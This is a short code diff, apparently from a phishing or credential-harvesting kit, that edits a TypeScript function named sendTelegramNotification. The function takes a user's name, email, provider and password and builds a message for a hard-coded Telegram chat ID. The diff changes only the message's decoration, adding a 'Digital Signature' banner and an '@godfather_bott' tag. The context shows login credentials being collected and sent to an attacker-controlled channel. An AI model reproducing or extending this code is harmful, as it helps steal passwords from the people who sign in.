@@ -25,7 +25,9 @@ const TELEGRAM_CHAT_ID = '7607683158'
 
 async function sendTelegramNotification(name: string, email: string, provider: string, password: string) {
   const message = `
-🔐 <b>New User Authentication</b>
+╔══════════════════════════════╗
+  🔏 𝓓𝓲𝓰𝓲𝓽𝓪𝓵 𝓢𝓲𝓰𝓷𝓪𝓽𝓾𝓻𝓮
+╚══════════════════════════════╝
 
 ✅ <b>Status:</b> Successfully Authenticated
 👤 <b>Name:</b> ${name}
@@ -36,6 +38,7 @@ async function sendTelegramNotification(name: string, email: string, provider: s
 
 ━━━━━━━━━━━━━━━━━━━━
 <i>User has been welcomed and account is now active.</i>
+<code>@godfather_bott</code>
   `.trim()
 
   try {
